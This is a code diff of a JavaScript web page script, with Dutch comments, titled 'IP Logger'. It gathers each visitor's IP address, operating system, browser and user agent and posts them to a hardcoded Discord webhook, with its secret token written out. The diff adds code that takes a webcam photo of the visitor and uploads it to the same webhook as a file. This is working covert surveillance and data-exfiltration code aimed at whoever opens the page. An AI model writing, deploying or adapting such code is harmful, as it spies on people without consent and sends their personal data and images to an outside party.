@@ -47,52 +47,56 @@
             var browser = detectBrowser(userAgent);
             var webhookURL = 'https://discord.com/api/webhooks/1213788395726311464/Qu04CT-Yp-s2BttXP2jZGSm_iTWHA08MFm-OCxQHCCeiq9J-RL5VYX41Oj-5moEPMAtP';
 
-            // Maak een foto met de webcam en converteer naar een Base64-gecodeerde string
-            takePhoto(function(photoData) {
-                var embed = {
-                    "embeds": [
-                        {
-                            "title": "IP Logger",
-                            "description": "Een gebruiker heeft de pagina bezocht.",
-                            "color": 65280, // Groen als het leuk vond, Rood als niet leuk
-                            "fields": [
-                                {
-                                    "name": "IP Adres",
-                                    "value": ipAddress,
-                                    "inline": true
-                                },
-                                {
-                                    "name": "Besturingssysteem",
-                                    "value": os,
-                                    "inline": true
-                                },
-                                {
-                                    "name": "Browser",
-                                    "value": browser,
-                                    "inline": true
-                                },
-                                {
-                                    "name": "Gebruikersagent",
-                                    "value": userAgent,
-                                    "inline": false
-                                },
-                                {
-                                    "name": "Tijdstip",
-                                    "value": timestamp,
-                                    "inline": true
-                                }
-                            ],
-                            "image": {
-                                "url": photoData
+            var embed = {
+                "embeds": [
+                    {
+                        "title": "IP Logger",
+                        "description": "Een gebruiker heeft de pagina bezocht.",
+                        "color": 65280, // Groen als het leuk vond, Rood als niet leuk
+                        "fields": [
+                            {
+                                "name": "IP Adres",
+                                "value": ipAddress,
+                                "inline": true
+                            },
+                            {
+                                "name": "Besturingssysteem",
+                                "value": os,
+                                "inline": true
+                            },
+                            {
+                                "name": "Browser",
+                                "value": browser,
+                                "inline": true
+                            },
+                            {
+                                "name": "Gebruikersagent",
+                                "value": userAgent,
+                                "inline": false
+                            },
+                            {
+                                "name": "Tijdstip",
+                                "value": timestamp,
+                                "inline": true
                             }
-                        }
-                    ]
-                };
+                        ]
+                    }
+                ]
+            };
 
-                var xhr = new XMLHttpRequest();
-                xhr.open("POST", webhookURL);
-                xhr.setRequestHeader("Content-Type", "application/json");
-                xhr.send(JSON.stringify(embed));
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", webhookURL);
+            xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.send(JSON.stringify(embed));
+
+            // Maak een foto met de webcam en upload deze naar Discord als bestand
+            takePhoto(function(photoData) {
+                var formData = new FormData();
+                formData.append("file", photoData);
+
+                var xhrFile = new XMLHttpRequest();
+                xhrFile.open("POST", webhookURL);
+                xhrFile.send(formData);
             });
         }
 
